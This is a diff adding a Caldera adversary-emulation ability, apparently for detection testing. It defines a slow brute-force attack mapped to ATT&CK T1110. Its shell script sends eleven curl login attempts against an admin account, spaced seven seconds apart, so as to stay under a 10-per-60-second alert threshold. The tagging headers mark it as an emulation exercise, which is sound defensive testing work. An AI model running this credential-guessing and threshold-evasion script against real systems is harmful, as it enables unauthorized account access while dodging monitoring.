@@ -1,0 +1,29 @@
+- id: dd44ee55-ff66-4aa7-bb88-cc9900112233
+  name: Slow Brute Force (Threshold Evasion)
+  description: 7초 간격으로 11회 로그인을 시도하여 10회/60초 threshold 룰을 회피합니다. 실제 공격자의 저속 브루트포스를 시뮬레이션합니다.
+  tactic: credential-access
+  technique:
+    attack_id: T1110
+    name: Brute Force
+  platforms:
+    linux:
+      sh:
+        command: |-
+          TARGET="http://#{target.url}"
+          OP_ID="#{operation_id}"
+
+          echo "[*] Slow Brute Force: 7초 간격 × 11회"
+          for i in $(seq 1 11); do
+            echo "  [${i}/11] Attempt..."
+            curl -s -o /dev/null -w "HTTP=%{http_code}\n" \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: T1110" \
+              -H "X-Caldera-Ability: dd44ee55-ff66-4aa7-bb88-cc9900112233" \
+              -A "Caldera/${OP_ID}/T1110/dd44ee55" \
+              -H "Content-Type: application/json" \
+              -X POST \
+              -d "{\"username\":\"admin\",\"password\":\"slow_pass_${i}\"}" \
+              "${TARGET}/api/auth/login"
+            [ $i -lt 11 ] && sleep 7
+          done
+          echo "[*] Slow brute force complete"
